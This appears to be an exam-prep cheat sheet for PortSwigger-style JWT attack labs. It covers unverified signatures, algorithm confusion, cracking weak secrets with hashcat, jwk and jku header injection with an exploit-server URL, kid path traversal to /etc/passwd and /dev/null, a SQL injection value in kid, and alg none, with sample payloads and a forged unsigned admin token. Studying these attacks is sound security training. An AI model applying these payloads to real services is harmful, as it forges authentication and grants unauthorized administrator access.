# JWT (JSON Web Tokens) - Stage 2

## 🎯 Overview

JWT attacks focus on manipulating the token structure, signature, or claims to escalate privileges.

## 🛠️ Essential Tools

**JWT Editor (Burp Extension)** - Essential for JWT manipulation
- Install from BApp Store
- Provides JWT Editor tab
- Highlights requests with JWTs
- Allows easy token modification

**Alternative:** JSON Web Tokens extension (simpler, quicker)

## 🔥 Attack Techniques

### Lab 1: Unverified Signature
**Bypass:** Server doesn't verify signature at all

**Steps:**
1. Decode JWT
2. Modify payload (e.g., `"sub": "administrator"`)
3. Keep signature as-is or remove it
4. Send modified token

**Example:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "administrator",
  "exp": 1234567890
}
```

---

### Lab 2: Flawed Signature Verification (Algorithm Confusion)
**Bypass:** Change `RS256` to `HS256`

**Concept:**
- RS256 uses asymmetric keys (public/private)
- HS256 uses symmetric key
- If server uses public key to verify HS256, we can sign with public key

**Steps:**
1. Get server's public key (usually `/jwks.json` or `/.well-known/jwks.json`)
2. Change `"alg": "RS256"` to `"alg": "HS256"`
3. Sign token with public key (using HS256)
4. Send modified token

**Using JWT Editor:**
1. New Symmetric Key → Paste PEM public key
2. Modify JWT payload
3. Sign with symmetric key

---

### Lab 3: Weak Signing Key (Brute Force)
**Bypass:** Crack weak secret key

**Using hashcat:**
```bash
hashcat -a 0 -m 16500 <jwt> /path/to/wordlist.txt
```

**Common weak secrets:**
- `secret`
- `secret123`
- `password`
- Application name

**Steps:**
1. Extract JWT
2. Use hashcat with wordlist
3. Once cracked, sign new JWT with secret
4. Modify payload to admin

---

### Lab 4: JWK Header Injection
**Bypass:** Inject your own public key in JWT header

**Concept:**
- Some servers accept `jwk` parameter in header
- We provide our own key and sign with it

**Steps:**
1. Generate RSA key pair (JWT Editor → New RSA Key)
2. Modify JWT payload (e.g., `"sub": "administrator"`)
3. Add `jwk` parameter to header with your public key
4. Sign with your private key

**Example Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "your-key-id",
    "n": "your-public-key-modulus"
  }
}
```

---

### Lab 5: JKU Header Injection
**Bypass:** Point to your own JWK Set URL

**Concept:**
- `jku` parameter points to URL with JWK Set
- If server fetches from our URL, we control the keys

**Steps:**
1. Generate RSA key pair
2. Create JWK Set on exploit server:
```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "your-key-id",
      "n": "your-public-key-modulus"
    }
  ]
}
```
3. Modify JWT header:
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://exploit-server.com/jwks.json",
  "kid": "your-key-id"
}
```
4. Sign with your private key

---

### Lab 6: KID Header Path Traversal
**Bypass:** Use path traversal in `kid` parameter

**Concept:**
- `kid` (Key ID) parameter specifies which key to use
- If vulnerable, can point to predictable file

**Technique 1: Null Byte**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"
}
```
Sign with empty string (null byte).

**Technique 2: Known File**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../etc/passwd"
}
```
Sign with contents of `/etc/passwd`.

**Technique 3: SQL Injection in KID**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "' UNION SELECT 'secret'--"
}
```
Sign with `secret`.

---

### Lab 7: Algorithm None
**Bypass:** Set algorithm to `none`

**Steps:**
1. Change `"alg": "HS256"` to `"alg": "none"`
2. Remove signature completely
3. Modify payload

**Example:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.
```
(Note the trailing dot with no signature)

## 🎓 Exam Tips

1. **Install JWT Editor extension** - Essential tool
2. **Check for `/jwks.json`** - Common key location
3. **Try algorithm confusion first** - RS256 → HS256
4. **Look for `kid` parameter** - Path traversal opportunity
5. **Test `none` algorithm** - Simple but effective
6. **Modify `sub` or `role` claims** - Common privilege escalation

## 🔍 Common JWT Claims

| Claim | Description | Attack Vector |
|-------|-------------|---------------|
| `sub` | Subject (username) | Change to `administrator` |
| `role` | User role | Change to `admin` |
| `admin` | Admin flag | Change to `true` |
| `exp` | Expiration time | Extend expiration |
| `iat` | Issued at | Modify timestamp |

## 📚 JWT Structure

```
header.payload.signature
```

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**
```json
{
  "sub": "user",
  "exp": 1234567890,
  "role": "user"
}
```

**Signature:**
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

## 🔗 Quick Reference

| Attack | Technique |
|--------|-----------|
| No verification | Modify payload, keep signature |
| Algorithm confusion | RS256 → HS256, sign with public key |
| Weak secret | Brute force with hashcat |
| JWK injection | Add `jwk` header with your key |
| JKU injection | Point `jku` to your server |
| KID path traversal | Use `../` in `kid` parameter |
| None algorithm | Set `alg` to `none`, remove signature |

## 📚 References

- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [JWT.io Debugger](https://jwt.io/)
- [JWT Editor Extension](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
